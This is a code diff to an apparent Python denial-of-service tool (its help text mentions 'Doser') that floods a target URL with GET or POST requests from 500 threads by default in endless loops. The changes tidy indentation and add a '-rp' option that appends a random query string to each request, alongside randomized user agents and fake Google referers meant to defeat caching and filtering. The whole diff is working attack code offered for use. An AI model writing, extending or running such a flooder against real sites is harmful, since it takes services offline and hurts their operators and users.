@@ -42,13 +42,13 @@ def initHeaders():
   useragent_list()
   global headers_useragents, additionalHeaders
   headers = {
-        'User-Agent': random.choice(headers_useragents),
-        'Cache-Control': 'no-cache',
-        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-        'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
-        'Keep-Alive': str(random.randint(110,120)),
-        'Connection': 'keep-alive'
-        }
+    'User-Agent': random.choice(headers_useragents),
+    'Cache-Control': 'no-cache',
+    'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+    'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
+    'Keep-Alive': str(random.randint(110,120)),
+    'Connection': 'keep-alive'
+  }
 
   if additionalHeaders:
     for header in additionalHeaders:
@@ -57,28 +57,31 @@ def initHeaders():
 
 def handleStatusCodes(status_code, text):
   global request_counter
-        if request_counter % 200 == 0:
-          # sys.stdout.write("\r%i requests has been sent" % request_counter)
-          print("\r%i requests has been sent" % request_counter)
-          # sys.stdout.flush()
+  if request_counter % 200 == 0:
+    # sys.stdout.write("\r%i requests has been sent" % request_counter)
+    print("\r%i requests has been sent" % request_counter)
+    # sys.stdout.flush()
   if status_code == 429:
-      printMsg("You have been throttled")
+    printMsg("You have been throttled")
   if status_code >= 500:
     print("Status: {}, text: {}".format(status_code, text))
     # printedMsg("Status code 500 received")
 
-def sendGET(url):
+def sendGET(url, randomUrlParam):
   global request_counter
   headers = initHeaders()
   try:
     request_counter+=1
-    request = requests.get(url, headers=headers)
-    # print 'her'
+    print(request_counter)
+    params = None
+    if randomUrlParam:
+      params = { "q": randomString(random.randint(5,10)) }
+    request = requests.get(url, params=params, headers=headers)
     handleStatusCodes(request.status_code, request.text)
   except:
     pass
 
-def sendPOST(url, payload):
+def sendPOST(url, payload, randomUrlParam):
   global request_counter
   headers = initHeaders()
   try:
@@ -95,8 +98,10 @@ class SendGETThread(threading.Thread):
   def run(self):
     try:
       while True:
-        global url
-        sendGET(url)
+        global url, randomUrlParam
+        print("sendGET(url)")
+        print(url)
+        sendGET(url, randomUrlParam)
     except:
       pass
 
@@ -104,8 +109,8 @@ class SendPOSTThread(threading.Thread):
   def run(self):
     try:
       while True:
-        global url, payload
-        sendPOST(url, payload)
+        global url, payload, randomUrlParam
+        sendPOST(url, payload, randomUrlParam)
     except:
       pass
 
@@ -120,11 +125,13 @@ def main(argv):
   parser.add_argument('-d', help='Specify data payload for POST request', default=None)
   parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
   parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
+  parser.add_argument('-rp', help='Specify if a random URL param should be used be used', default=False, action='store_true')
   args = parser.parse_args()
 
-  global url, payload, additionalHeaders
+  global url, payload, additionalHeaders, randomUrlParam
   additionalHeaders = args.ah
   payload = args.d
+  randomUrlParam = args.rp
 
   if args.g:
     url = args.g
